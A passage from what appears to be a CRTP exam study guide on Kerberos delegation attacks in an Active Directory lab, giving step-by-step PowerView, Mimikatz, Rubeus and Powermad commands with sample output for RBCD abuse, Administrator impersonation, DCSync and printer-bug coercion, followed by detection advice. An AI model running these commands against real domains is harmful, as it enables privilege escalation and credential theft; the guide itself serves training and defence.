│  │    /msdsspn:time/dc /altservice:ldap /ptt    │                 │
│  │ 4. DCSync: SafetyKatz.exe dcsync             │                 │
│  └─────────────────────────────────────────────┘                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Resource-Based Constrained Delegation (RBCD)

### How RBCD Differs

RBCD flips the delegation model. Instead of the front-end service declaring where it can delegate (controlled by Domain Admins via `msDS-AllowedToDelegateTo`), the **target resource** declares who can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```
┌──────────────────────────────────────────────────────────────────┐
│       RBCD — HOW IT DIFFERS FROM TRADITIONAL DELEGATION          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  CONSTRAINED DELEGATION (Traditional):                           │
│  ┌──────────────────┐                                            │
│  │ Front-End (Web)  │  msDS-AllowedToDelegateTo:                 │
│  │                  │  → CIFS/backend-sql                        │
│  │ "I am ALLOWED to │                                            │
│  │  delegate to     │  ★ Configured by Domain Admin             │
│  │  backend-sql"    │  ★ Requires SeEnableDelegation privilege   │
│  └──────────────────┘                                            │
│                                                                  │
│  RESOURCE-BASED CONSTRAINED DELEGATION (RBCD):                   │
│  ┌──────────────────┐                                            │
│  │ Back-End (SQL)   │  msDS-AllowedToActOnBehalfOfOtherIdentity: │
│  │                  │  → Frontend-Web$ can delegate to me         │
│  │ "I ALLOW the     │                                            │
│  │  front-end to    │  ★ Configured by RESOURCE ADMIN            │
│  │  delegate to me" │  ★ Only needs Write permission on target!  │
│  └──────────────────┘  ★ No SeEnableDelegation needed!           │
│                                                                  │
│  WHY ATTACKERS LOVE RBCD:                                        │
│  ┌─────────────────────────────────────────────────┐             │
│  │ 1. Only needs WRITE permissions on the target   │             │
│  │    (GenericWrite, GenericAll, WriteProperty,     │             │
│  │     WriteDacl over the computer object)          │             │
│  │                                                  │             │
│  │ 2. Control over an account with an SPN:          │             │
│  │    → Admin on any domain-joined machine          │             │
│  │    → OR create a new machine account              │             │
│  │      (ms-DS-MachineAccountQuota = 10 default!)   │             │
│  │                                                  │             │
│  │ 3. No Domain Admin privileges needed!            │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### RBCD Attack Flow

```
┌──────────────────────────────────────────────────────────────────┐
│                  RBCD ATTACK FLOW                                │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PREREQUISITES:                                                  │
│  ┌─────────────────────────────────────────────────┐             │
│  │ A. Write permissions on a target computer object │             │
│  │    (GenericWrite/GenericAll/WriteProperty/        │             │
│  │     WriteDacl)                                    │             │
│  │                                                   │             │
│  │ B. Control of an account with SPN:                │             │
│  │    → We already have admin on student VMs          │             │
│  │      (domain-joined = has SPN = dcorp-student1$)  │             │
│  │    → OR create a new machine account               │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  Step 1: Find Write permissions on computer objects              │
│  ┌───────────────────────────────────┐                           │
│  │ Find-InterestingDomainACL |       │                           │
│  │ ?{$_.identityreferencename        │                           │
│  │   -match 'ciadmin'}               │                           │
│  │                                    │                           │
│  │ → ciadmin has Write on dcorp-mgmt │                           │
│  └─────────────────┬─────────────────┘                           │
│                    │                                             │
│                    ▼                                             │
│  Step 2: Configure RBCD on target                                │
│  ┌───────────────────────────────────┐                           │
│  │ Set-ADComputer -Identity          │                           │
│  │   dcorp-mgmt -PrincipalsAllowed   │                           │
│  │   ToDelegateToAccount             │                           │
│  │   dcorp-student1$                 │                           │
│  └─────────────────┬─────────────────┘                           │
│                    │                                             │
│                    ▼                                             │
│  Step 3: Get AES key of our controlled account                   │
│  ┌───────────────────────────────────┐                           │
│  │ Invoke-Mimikatz -Command          │                           │
│  │   '"sekurlsa::ekeys"'             │                           │
│  │ → dcorp-student1$ AES256 key      │                           │
│  └─────────────────┬─────────────────┘                           │
│                    │                                             │
│                    ▼                                             │
│  Step 4: S4U attack to get ticket as Administrator               │
│  ┌───────────────────────────────────┐                           │
│  │ Rubeus.exe s4u                    │                           │
│  │   /user:dcorp-student1$           │                           │
│  │   /aes256:<key>                   │                           │
│  │   /msdsspn:http/dcorp-mgmt        │                           │
│  │   /impersonateuser:administrator  │                           │
│  │   /ptt                            │                           │
│  └─────────────────┬─────────────────┘                           │
│                    │                                             │
│                    ▼                                             │
│  Step 5: Access the target!                                      │
│  ┌───────────────────────────────────┐                           │
│  │ winrs -r:dcorp-mgmt cmd.exe      │                           │
│  │ → Shell on dcorp-mgmt as admin!   │                           │
│  └───────────────────────────────────┘                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Step 1: Enumerate Write Permissions on Computer Objects

```powershell
# ============================================================
# FIND USERS WITH WRITE PERMISSIONS ON COMPUTER OBJECTS
# ============================================================

Import-Module .\PowerView.ps1

# Method 1: Find interesting ACLs for a specific user
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

# Method 2: Comprehensive RBCD enumeration script
# Save as .\SearchRBCD.ps1 and run

# import PowerView
Import-Module C:\Tools\PowerView.ps1

# get all computers in the domain
$computers = Get-DomainComputer

# get all users in the domain
$users = Get-DomainUser

# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{
            ($_.ActiveDirectoryRights -match ($accessRights -join '|'))
        }

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```

#### Running the RBCD Enumeration Script

```powershell
# Run the script
.\SearchRBCD.ps1
```

#### Example Output

```
PS C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=CI Admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceSID    : S-1-5-21-719815819-3726368948-3917688200-1121

[+] ciadmin has GenericWrite on DCORP-MGMT!
[+] This means we can configure RBCD on dcorp-mgmt!
```

### Step 2: Configure RBCD on the Target

```powershell
# ============================================================
# CONFIGURE RBCD ON dcorp-mgmt
# Allow student machines to delegate to dcorp-mgmt
# Requires: ciadmin's credentials (who has Write on dcorp-mgmt)
# ============================================================

# Using the ActiveDirectory module
# Set which computers can delegate to dcorp-mgmt
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps

# Verify the configuration
Get-ADComputer dcorp-mgmt -Properties msds-allowedtoactonbehalfofotheridentity, PrincipalsAllowedToDelegateToAccount
```

#### Example Output

```
PS C:\AD\Tools> Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
PS C:\AD\Tools> Get-ADComputer dcorp-mgmt -Properties PrincipalsAllowedToDelegateToAccount

DistinguishedName                   : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
Name                                 : DCORP-MGMT
PrincipalsAllowedToDelegateToAccount : {CN=DCORP-STUDENT1,OU=StudentMachines,...,
                                        CN=DCORP-STUDENT2,OU=StudentMachines,...}
```

### Step 3: Extract AES Keys of Your Controlled Machine

```powershell
# ============================================================
# GET THE AES KEY OF dcorp-student1$ (our controlled machine)
# Requires: Admin on dcorp-student1
# ============================================================

Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Look for dcorp-student1$ in the output
```

#### Example Output

```
Authentication Id : 0 ; 999 (00000000:000003E7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STUDENT1$
Domain            : DCORP
Logon Server      : (null)

         * Username : dcorp-student1$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac  d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2
           aes128_hmac  e2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7
           rc4_hmac_nt  32ed87bdb5fdc5e9cba88547376818d4
```

### Step 4: S4U Attack — Impersonate Administrator

```powershell
# ============================================================
# RBCD S4U ATTACK — Access dcorp-mgmt as Administrator
# ============================================================

# Use the AES key of dcorp-student1$ with Rubeus
# Request a ticket to HTTP/dcorp-mgmt as Administrator
Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

#### Example Output

```
PS C:\AD\Tools> Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-student1$'
[+] TGT request successful!

[*] Action: S4U2self

[*] Building S4U2self request for: 'dcorp-student1$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Impersonating user 'administrator' to self
[+] S4U2self success!

[*] Action: S4U2proxy

[*] Building S4U2proxy request for: 'administrator@DOLLARCORP.MONEYCORP.LOCAL'
[*] Sending S4U2proxy request for service: 'http/dcorp-mgmt'
[+] S4U2proxy success!

[+] Ticket successfully imported!

  ServiceName              :  http/dcorp-mgmt
  UserName                 :  administrator@DOLLARCORP.MONEYCORP.LOCAL
```

### Step 5: Access the Target

```powershell
# ============================================================
# ACCESS dcorp-mgmt AS ADMINISTRATOR
# ============================================================

# Using winrs (WinRM)
winrs -r:dcorp-mgmt cmd.exe

# Or using PSRemoting
Enter-PSSession -ComputerName dcorp-mgmt

# Verify
whoami
# dcorp\administrator

hostname
# dcorp-mgmt
```

### RBCD — Alternative: Creating a New Machine Account

If you don't already control a domain-joined machine, you can create a new machine account (default MachineAccountQuota = 10 for all domain users).

```powershell
# ============================================================
# RBCD USING A NEW MACHINE ACCOUNT
# When you don't control an existing domain-joined machine
# ============================================================

# Step 1: Create a new machine account using Powermad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount YOURCOMPUTER -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)

# Step 2: Get the SID of the new computer
$ComputerSid = Get-DomainComputer YOURCOMPUTER -Properties objectsid | Select-Object -Expand objectsid

# Step 3: Build the security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Step 4: Set the RBCD attribute on the target (using ciadmin's credentials)
$credentials = New-Object System.Management.Automation.PSCredential "dcorp\ciadmin", (ConvertTo-SecureString "CiAdminPassword!" -AsPlainText -Force)
Get-DomainComputer dcorp-mgmt | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose

# Step 5: Get the NTLM hash of the new computer account
.\Rubeus.exe hash /password:Password123! /user:YOURCOMPUTER$ /domain:dollarcorp.moneycorp.local

# Step 6: S4U attack using the new machine account
.\Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:<Hash_Of_New_Computer> /impersonateuser:administrator /msdsspn:cifs/dcorp-mgmt.dollarcorp.moneycorp.local /ptt

# Step 7: Verify access
ls \\dcorp-mgmt.dollarcorp.moneycorp.local\c$
```

#### Example Output

```
PS C:\AD\Tools> New-MachineAccount -MachineAccount YOURCOMPUTER -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)
[+] Machine account YOURCOMPUTER$ added to the domain

PS C:\AD\Tools> .\Rubeus.exe hash /password:Password123! /user:YOURCOMPUTER$ /domain:dollarcorp.moneycorp.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123!
[*] Input username             : YOURCOMPUTER$
[*] Input domain               : dollarcorp.moneycorp.local
[*] Salt                       : DOLLARCORP.MONEYCORP.LOCALhostYOURCOMPUTER.dollarcorp.moneycorp.local
[*]       rc4_hmac             : 58a478135a93ac3bf058a5ea0e8fdb71
[*]       aes128_cts_hmac_sha1 : b3c7a4e5d6f7a8b9c0d1e2f3a4b5c6d7
[*]       aes256_cts_hmac_sha1 : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
[*]       des_cbc_md5          : f1e2d3c4b5a6

PS C:\AD\Tools> .\Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:58a478135a93ac3bf058a5ea0e8fdb71 /impersonateuser:administrator /msdsspn:cifs/dcorp-mgmt.dollarcorp.moneycorp.local /ptt

[+] S4U2self success!
[+] S4U2proxy success!
[+] Ticket successfully imported!

PS C:\AD\Tools> ls \\dcorp-mgmt.dollarcorp.moneycorp.local\c$

    Directory: \\dcorp-mgmt.dollarcorp.moneycorp.local\c$

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d-----       11/11/2022  11:00 AM            PerfLogs
d-r---        4/10/2026  10:00 AM            Program Files

[+] SUCCESS! Accessing dcorp-mgmt as Administrator via RBCD!
```

### RBCD with /altservice — Multiple Services

You can also use the `/altservice` flag to include additional services in your RBCD ticket request, giving access to multiple service types on the target.

```powershell
# ============================================================
# RBCD WITH MULTIPLE SERVICES VIA /altservice
# ============================================================

# Request ticket with multiple alternative services
.\Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:<Hash> /impersonateuser:administrator /msdsspn:cifs/dcorp-mgmt.dollarcorp.moneycorp.local /altservice:host,rpcss,wsman,http,ldap,krbtgt,winrm /ptt

# Now you can access ALL of these services on dcorp-mgmt:
# • cifs   → File system (dir \\target\c$)
# • host   → PsExec, WMI, scheduled tasks
# • rpcss  → WMI execution
# • wsman  → WinRM / PSRemoting
# • http   → WinRM / PSRemoting
# • ldap   → LDAP queries (DCSync if target is DC!)
# • winrm  → PowerShell Remoting

# Example: PSRemoting via WinRM
Enter-PSSession -ComputerName dcorp-mgmt
```

---

## Important Limitations: Protected Users

```
┌──────────────────────────────────────────────────────────────────┐
│           DELEGATION ATTACK LIMITATIONS                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ACCOUNTS THAT CANNOT BE IMPERSONATED VIA DELEGATION:            │
│                                                                  │
│  ┌─────────────────────────────────────────────────┐             │
│  │ 1. "Account is sensitive and cannot be          │             │
│  │     delegated" flag                             │             │
│  │    → UserAccountControl contains NOT_DELEGATED  │             │
│  │    → S4U will fail for these users              │             │
│  │                                                  │             │
│  │ 2. Members of the "Protected Users" group        │             │
│  │    → Built-in security group                    │             │
│  │    → Members cannot be impersonated via any      │             │
│  │      form of delegation                          │             │
│  │    → Also disables NTLM auth, forces AES, etc.  │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  HOW TO CHECK:                                                   │
│  ┌─────────────────────────────────────────────────┐             │
│  │ # Check if a user is protected from delegation  │             │
│  │ Get-DomainUser -Identity Administrator |        │             │
│  │   Select-Object useraccountcontrol               │             │
│  │ # Look for NOT_DELEGATED flag                   │             │
│  │                                                  │             │
│  │ # Check Protected Users group membership         │             │
│  │ Get-DomainGroupMember -Identity                  │             │
│  │   'Protected Users'                              │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  ★ CRTP TIP: If Administrator is protected, try impersonating  │
│    other DA accounts or service accounts instead.               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## CRTP Quick Reference Card

```
┌──────────────────────────────────────────────────────────────────┐
│            CRTP DELEGATION ATTACKS CHEAT SHEET                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ═══ ENUMERATE DELEGATION ═══                                    │
│  Get-DomainComputer -UnConstrained                               │
│  Get-DomainUser -TrustedToAuth                                   │
│  Get-DomainComputer -TrustedToAuth                               │
│  Get-DomainUser -LDAPFilter                                      │
│    "(userAccountControl:1.2.840.113556.1.4.803:=524288)"         │
│  Find-InterestingDomainACL |                                     │
│    ?{$_.identityreferencename -match 'ciadmin'}                  │
│                                                                  │
│  ═══ UNCONSTRAINED DELEGATION ═══                                │
│                                                                  │
│  # Passive — export cached tickets:                              │
│  SafetyKatz.exe "sekurlsa::tickets /export" "exit"               │
│  SafetyKatz.exe "kerberos::ptt <ticket.kirbi>" "exit"            │
│                                                                  │
│  # Active — Printer Bug + Rubeus:                                │
│  .\Rubeus.exe monitor /interval:5 /nowrap                        │
│  MS-RPRN.exe \\dcorp-dc \\dcorp-appsrv  (from another shell)    │
│  Rubeus.exe ptt /ticket:<base64_TGT>                             │
│                                                                  │
│  # Post-exploitation:                                            │
│  .\Rubeus.exe renew /ticket:<base64> /ptt                        │
│  .\Rubeus.exe asktgs /ticket:<base64>                            │
│    /service:cifs/dcorp-dc... /ptt                                │
│  SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"     │
│                                                                  │
│  ═══ CONSTRAINED DELEGATION ═══                                  │
│                                                                  │
│  # User account:                                                 │
│  Rubeus.exe s4u /user:websvc                                     │
│    /aes256:<key>                                                 │
│    /impersonateuser:Administrator                                │
│    /msdsspn:CIFS/target /ptt                                     │
│                                                                  │
│  # Computer account with altservice:                             │
│  Rubeus.exe s4u /user:dcorp-adminsrv$                            │
│    /aes256:<key>                                                 │
│    /impersonateuser:Administrator                                │
│    /msdsspn:time/dcorp-dc /altservice:ldap /ptt                  │
│  SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"     │
│                                                                  │
│  ═══ RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ═══           │
│                                                                  │
│  # Configure RBCD:                                               │
│  $comps = 'dcorp-student1$','dcorp-student2$'                    │
│  Set-ADComputer -Identity dcorp-mgmt                             │
│    -PrincipalsAllowedToDelegateToAccount $comps                  │
│                                                                  │
│  # Get machine AES key:                                          │
│  Invoke-Mimikatz -Command '"sekurlsa::ekeys"'                    │
│                                                                  │
│  # S4U attack:                                                   │
│  Rubeus.exe s4u /user:dcorp-student1$                            │
│    /aes256:<key>                                                 │
│    /msdsspn:http/dcorp-mgmt                                      │
│    /impersonateuser:administrator /ptt                           │
│  winrs -r:dcorp-mgmt cmd.exe                                     │
│                                                                  │
│  # RBCD with new machine account:                                │
│  New-MachineAccount -MachineAccount YOURPC                       │
│    -Password $(ConvertTo-SecureString "Pass!" -AsPlainText       │
│    -Force)                                                       │
│  Rubeus.exe hash /password:Pass! /user:YOURPC$                   │
│    /domain:domain.local                                          │
│  Rubeus.exe s4u /user:YOURPC$ /rc4:<hash>                        │
│    /impersonateuser:administrator                                │
│    /msdsspn:cifs/target.domain.local /ptt                        │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Detection and Blue Team Indicators

```
┌──────────────────────────────────────────────────────────────────┐
│           DELEGATION ATTACK DETECTION                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  UNCONSTRAINED DELEGATION:                                       │
│  • Event ID 4624 (Logon Type 3) with delegation flags            │
│  • Monitor for TGT forwarding from non-DC machines               │
│  • Disable Print Spooler on Domain Controllers!                  │
│  • Reduce machines with Unconstrained Delegation                 │
│                                                                  │
│  CONSTRAINED DELEGATION:                                         │
│  • Event ID 4769 — TGS request with S4U flags                   │
│  • Monitor for S4U2self/S4U2proxy from unexpected accounts       │
│  • Alert on altservice SPN mismatches                            │
│  • Audit msDS-AllowedToDelegateTo regularly                      │
│                                                                  │
│  RBCD:                                                           │
│  • Event ID 5136 — changes to msDS-AllowedToActOn...            │
│  • Event ID 4741 — new computer account creation                 │
│  • Monitor MachineAccountQuota usage                             │
│  • Set ms-DS-MachineAccountQuota = 0                             │
│  • Audit GenericWrite/GenericAll on computer objects              │
│                                                                  │
│  GENERAL:                                                        │
│  • Add sensitive accounts to Protected Users group               │
│  • Enable "Account is sensitive and cannot be delegated"         │
│  • Regularly audit delegation configurations                     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## References

- [Delegating Like a Boss: Abusing Kerberos Delegation — GuidePoint Security](https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/)
- [Resource-Based Constrained Delegation (RBCD) Attack — Redfox Cybersecurity](https://www.redfoxsec.com/blog/resource-based-constrained-delegation-rbcd-attack-how-attackers-exploit-active-directory-trust)
- [Attacking Kerberos Delegation — Redfox Cybersecurity](https://www.redfoxsec.com/blog/attacking-kerberos-delegation)
- [Abusing Delegation with Impacket — Black Hills Information Security](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-1/)
- [A Low Dive into Kerberos Delegations — LuemmelSec](https://luemmelsec.github.io/S4fuckMe2selfAndUAndU2proxy-A-low-dive-into-Kerberos-delegations/)
- [RBCD — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [Resource-Based Constrained Delegation RBCD — Altered Security](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd)
- [Rubeus — GhostPack (GitHub)](https://github.com/GhostPack/Rubeus)
- [Powermad — Kevin Robertson (GitHub)](https://github.com/Kevin-Robertson/Powermad)
- [MITRE ATT&CK T1550.003 — Use Alternate Authentication: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [Microsoft Docs — Kerberos Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
